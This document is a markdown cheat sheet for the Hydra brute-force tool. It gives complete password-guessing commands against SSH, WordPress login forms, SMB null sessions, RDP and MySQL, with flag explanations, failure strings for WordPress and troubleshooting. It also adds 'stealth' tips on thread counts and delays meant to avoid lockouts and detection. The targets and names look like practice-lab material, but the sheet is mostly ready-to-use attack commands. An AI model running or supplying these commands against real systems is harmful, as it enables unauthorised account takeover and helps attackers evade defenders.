# Hydra Cheat Sheet – Brute-Force Protocols

## Supported Protocols
FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY,  
HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy,  
MYSQL, POSTGRES, RDP, SIP, SMB, SMTP, SMTP-Enum, SSH, etc.

## General Summary
Hydra is a brute-force tool for attacking login services (SSH, FTP, web forms, etc.) using usernames/passwords.  
Syntax varies by protocol. Always test with small lists first to confirm.

## General Syntax
```bash
hydra [options] TARGET SERVICE
```
Common options:
- `-l user` / `-L file` → single username or list  
- `-p pass` / `-P file` → single password or list  
- `-V` → full verbose (shows every attempt)  
- `-v` → basic status only  
- `-I` → ignore restore file  
- `-t N` → threads (4–16 for SSH, 32–64 for HTTP)  
- `-w N` / `-W N` → wait N seconds between tries/after fail  
- `-e nsr` → null, same-as-login, reversed  
- `-u` → loop users first (faster)  
- `-o found.txt` → save valid creds  

## 1. SSH Brute-Force Example
```bash
hydra -l molly -P rockyou.txt 10.10.10.10 ssh -V -I -t 8 -w 5 -W 10 -e nsr -u -s PORT
```

**Flags explained**:
- `-l <user>` → single username  
- `-P <wordlist>` → password list  
- `-V` → full verbose (every attempt)  
- `-I` → skip restore  
- `-t 8` → 8 threads (safe max for SSH, avoids lockouts)  
- `-w 5` / `-W 10` → delays to stay stealthy  
- `-e nsr` → extra quick checks  
- `-u` → users first (faster)  
- `-s PORT` → custom port (if not 22)  

**What it does**:  
- Tests every password for molly  
- 8 parallel attempts  
- Stops on first valid  

**Noise tip**: SSH is slow — max ~10–30 tries/sec. Use -t 4 if blocked.

## 2. Web Form (POST) Brute-Force Example (WordPress Login)
```bash
hydra -l elliot -P rockyou.txt 10.10.10.10 http-post-form \
      "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
      -V -I -t 32
```

**Flags explained**:
- `-l <user>` → single username  
- `-P <wordlist>` → password list  
- `http-post-form` → POST form module  
- `"<path>:<POST data>:<failure string>"` → core format (see below)  
- `-V` → full verbose  
- `-I` → skip restore  
- `-t 32` → 32 threads (fast for HTTP)  

**Format explained**:
- `<path>` → login URL (e.g., /wp-login.php)  
- `<POST data>` → exact form fields with placeholders  
  - `log` = username field  
  - `pwd` = password field  
  - `wp-submit=Log+In` = submit button (required, + = space)  
  - ^USER^ / ^PASS^ = replaced during attack  
- `<failure string>` → substring in failed response (e.g., :ERROR, :incorrect)  

**What it does**:  
- Sends POST to login page  
- If response contains "ERROR" → failure → continues  
- Stops on valid login  

**Common WP failure strings**:  
- `:ERROR`  
- `:incorrect`  
- `:The password you entered`  
- `:Invalid username`  

## Other Examples
- **Null session SMB**:
  ```bash
  hydra -l '' -p '' 10.10.10.10 smb -s 445 -V
  ```

- **RDP**:
  ```bash
  hydra -l admin -P rockyou.txt 10.10.10.10 rdp -V -t 1
  ```

- **MySQL**:
  ```bash
  hydra -l root -P rockyou.txt 10.10.10.10 mysql -V -I
  ```

## Troubleshooting Common Errors

- **[ERROR] Unknown service** → Wrong service name (e.g., use `smb` not `samba`)  
- **[ERROR] variables need ^USER^ / ^PASS^** → Add them in POST data  
- **[WARNING] Restorefile** → Add `-I`  
- **False positives** → Wrong failure string (test with known wrong creds)  
- **Stuck / slow** → Reduce `-t`, add `-w 5 -W 10`  

**Noise tip**: High threads = high noise. Use -t 1–4 for stealth.

**Bottom line**: Always check form HTML/Network tab for POST data/failure string. Test with tiny lists.

